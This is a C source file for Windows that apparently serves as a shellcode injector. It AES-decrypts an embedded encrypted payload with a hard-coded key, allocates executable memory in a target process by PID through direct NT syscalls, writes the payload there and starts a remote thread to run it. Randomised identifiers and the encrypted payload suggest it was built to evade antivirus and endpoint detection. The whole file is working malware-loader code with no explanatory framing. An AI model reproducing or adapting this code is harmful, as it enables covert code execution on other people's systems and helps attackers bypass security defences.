#include <Windows.h>
#include "syscals.h"


int NKmi8RfYYy(unsigned char * zWeEHSMyXh, DWORD F9waK32nYG, unsigned char * hvahDWQzu4, size_t tx7JGDpKmw) {

	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)hvahDWQzu4, (DWORD)tx7JGDpKmw, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, zWeEHSMyXh, &F9waK32nYG)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}
int main(int argc, char* argv[])
{
	DWORD pid = 4244;

	unsigned char e4uibi2cHQ[] = { 0x70, 0x61, 0x6b, 0x69, 0x73, 0x74, 0x61, 0x6e, 0x7a, 0x69, 0x6e, 0x64, 0x61, 0x62, 0x61, 0x64 };
	unsigned char fokXnrnoQZ[] = { 0x7c, 0xa5, 0xae, 0xc2, 0xc2, 0xee, 0x78, 0xf, 0x64, 0xeb, 0xc7, 0xd, 0x36, 0xad, 0x52, 0x35, 0x52, 0xd5, 0x77, 0x2b, 0x37, 0xf7, 0x87, 0xc1, 0x8f, 0xec, 0x7f, 0xdf, 0xb1, 0x89, 0x46, 0x36, 0xfa, 0xec, 0xf5, 0xe0, 0xe2, 0x59, 0x81, 0xec, 0xb9, 0xed, 0xf0, 0xb9, 0x2, 0x68, 0xa2, 0x4d, 0x65, 0x86, 0x59, 0x40, 0xf3, 0x1c, 0x56, 0xf, 0xd1, 0x6b, 0x19, 0xe8, 0xe7, 0xde, 0xea, 0x73, 0xf7, 0x15, 0xf5, 0xaf, 0x20, 0xb8, 0x6b, 0x64, 0x5f, 0xe, 0x22, 0x5f, 0x47, 0xd8, 0xbf, 0x19, 0x9b, 0x50, 0x43, 0xab, 0xb0, 0xeb, 0xfb, 0x6a, 0x7f, 0x1, 0xa6, 0x76, 0xd8, 0xe6, 0x21, 0xe9, 0xbb, 0x19, 0x7f, 0x21, 0x7f, 0x31, 0xd7, 0xb9, 0x22, 0x68, 0x6e, 0xb5, 0x9c, 0xb2, 0x1b, 0xa4, 0x4d, 0xd3, 0x9e, 0xd1, 0xe9, 0xa, 0x52, 0x51, 0xb7, 0x1f, 0xfc, 0x89, 0xa3, 0x4e, 0xf2, 0xd7, 0x45, 0x9a, 0x63, 0x62, 0x3a, 0x7a, 0x88, 0x0, 0x13, 0xa2, 0x10, 0xd7, 0xcf, 0xc9, 0x11, 0x15, 0x50, 0xe1, 0x30, 0x67, 0x3e, 0x38, 0xae, 0x51, 0x42, 0xbf, 0xa6, 0xb8, 0xda, 0xa1, 0x89, 0xc2, 0xbc, 0x37, 0xb2, 0x7, 0x53, 0xa3, 0x9e, 0x52, 0x1b, 0x57, 0x6b, 0x68, 0x56, 0x67, 0x40, 0x29, 0x1d, 0x6b, 0x22, 0x3f, 0x2c, 0x35, 0xc5, 0x59, 0x9b, 0x66, 0x2b, 0xae, 0xf0, 0xcd, 0x81, 0xfc, 0x7c, 0x6c, 0x48, 0x5e, 0xfd, 0xac, 0x34, 0xa6, 0x57, 0xa9, 0x43, 0xcd, 0x2, 0xf1, 0xb7, 0x31, 0x78, 0xdc, 0x46, 0xd3, 0xde, 0x50, 0x97, 0x5d, 0x7b, 0xf1, 0xf8, 0xbc, 0x72, 0x21, 0x7, 0x72, 0xa4, 0xc5, 0x92, 0xb0, 0xdd, 0x4d, 0xe7, 0x6c, 0xdd, 0x3a, 0xa9, 0x25, 0x4b, 0x65, 0x77, 0x4e, 0x7b, 0xce, 0xb2, 0xc, 0x46, 0x5d, 0xac, 0x60, 0x24, 0x7a, 0x66, 0xb7, 0x6e, 0xf1, 0xfc, 0x9d, 0x53, 0x9c, 0x73, 0x79, 0xcc, 0x1, 0x39, 0xc8, 0x5b, 0x3a, 0x91, 0x40, 0xce, 0xd9, 0x7d, 0xc4, 0x7a, 0xfb, 0x9, 0xba, 0x78, 0x9e, 0x68, 0xa0, 0x73, 0x55, 0xb, 0x3b, 0x78, 0x95, 0x6e, 0x2c, 0x14, 0x4, 0xee, 0x7e, 0xa3, 0xaa, 0x8f, 0xbb, 0x47, 0x4b, 0x1d, 0x8d, 0xaf, 0xd4, 0xf3, 0x62, 0x99, 0x25, 0x1, 0xd2, 0x19, 0xb7, 0xba, 0xc3, 0x68, 0x29, 0x5f, 0x10, 0xb7, 0xa6, 0x25, 0xbb, 0xd7, 0xaa, 0xbb, 0xfc, 0x5b, 0xed, 0x0, 0xb5, 0xca, 0xa1, 0xcc, 0x2e, 0xa8, 0x61, 0x21, 0xb3 };
	SIZE_T Kqy1NyrBdA = sizeof(fokXnrnoQZ);
	DWORD Kqy1NyrBdAA = sizeof(fokXnrnoQZ);

	HANDLE processHandle;
	OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
	LPVOID baseAddress = NULL;
	NtAllocateVirtualMemory(processHandle, &baseAddress, 0, &Kqy1NyrBdA, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	NKmi8RfYYy((unsigned char *)fokXnrnoQZ, Kqy1NyrBdAA, e4uibi2cHQ, sizeof(e4uibi2cHQ));
	NtWriteVirtualMemory(processHandle, baseAddress, &fokXnrnoQZ, sizeof(fokXnrnoQZ), NULL);
	HANDLE threadHandle;
	NtCreateThreadEx(&threadHandle, GENERIC_EXECUTE, NULL, processHandle, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
	NtClose(processHandle);

	return 0;
}